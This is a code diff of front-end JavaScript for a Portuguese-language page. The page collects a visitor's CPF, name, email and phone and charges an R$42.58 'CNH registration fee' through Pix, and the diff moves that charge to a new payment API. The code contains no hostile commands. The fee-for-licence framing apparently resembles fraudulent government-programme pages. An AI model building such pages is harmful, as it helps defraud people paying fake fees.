@@ -746,24 +746,25 @@
       document.getElementById('loadingScreen').classList.add('active');
 
       try {
-        const response = await fetch(`${API_URL}/api/transactions/create`, {
+        const response = await fetch(`${API_URL}/api/mangofy/pix/v3`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            cpf: cpf.replace(/\D/g, ''),
-            amount: 42.58,
-            paymentMethod: 'pix',
-            paymentType: 'taxa_ir',
+            external_code: `CNH_UP2_${Date.now()}`,
+            amount: 4258, // Valor em centavos (R$ 42,58)
             customer: {
               name: nome,
               email: email,
+              document: cpf.replace(/\D/g, ''),
               phone: telefone.replace(/\D/g, ''),
             },
-            utm_source: 'cnh_social',
-            utm_medium: 'web',
-            utm_campaign: 'taxa_ir',
+            items: [{
+              code: 'taxa_inscricao',
+              name: 'Taxa de Inscrição CNH',
+              amount: 4258
+            }]
           }),
         });
 
@@ -779,26 +780,11 @@
         currentTransaction = result.data;
 
         // Exibir QR Code
-        if (result.data.paymentData) {
-          const pixCode = result.data.paymentData.qrCode || result.data.paymentData.copyPaste;
+        if (result.data.pix) {
+          const pixCode = result.data.pix.copyAndPaste;
           
-          // Preparar QR Code
-          let qrCodeSrc = '';
-          
-          if (result.data.paymentData.qrCodeBase64 && result.data.paymentData.qrCodeBase64.trim() !== '') {
-            // Se tiver base64, usar ele
-            if (result.data.paymentData.qrCodeBase64.startsWith('data:image')) {
-              qrCodeSrc = result.data.paymentData.qrCodeBase64;
-            } else {
-              qrCodeSrc = 'data:image/png;base64,' + result.data.paymentData.qrCodeBase64;
-            }
-          } else if (result.data.paymentData.qrCodeUrl && result.data.paymentData.qrCodeUrl.trim() !== '') {
-            // Se tiver URL, usar ela
-            qrCodeSrc = result.data.paymentData.qrCodeUrl;
-          } else if (pixCode) {
-            // Se não tiver imagem, gerar QR Code usando API externa
-            qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(pixCode)}`;
-          }
+          // Gerar QR Code usando API externa (a nova API não retorna imagem)
+          const qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(pixCode)}`;
           
           document.getElementById('qrCodeImage').src = qrCodeSrc;
           document.getElementById('pixCode').textContent = pixCode;
@@ -806,8 +792,8 @@
           // Abrir modal
           document.getElementById('pixModal').classList.add('active');
           
-          // Iniciar timer (15 minutos padrão se expiresAt estiver vazio)
-          const expiresAt = result.data.paymentData.expiresAt || new Date(Date.now() + 15 * 60 * 1000).toISOString();
+          // Iniciar timer
+          const expiresAt = result.data.pix.expiresAt || new Date(Date.now() + 15 * 60 * 1000).toISOString();
           startPixTimer(expiresAt);
           
           // Conectar WebSocket
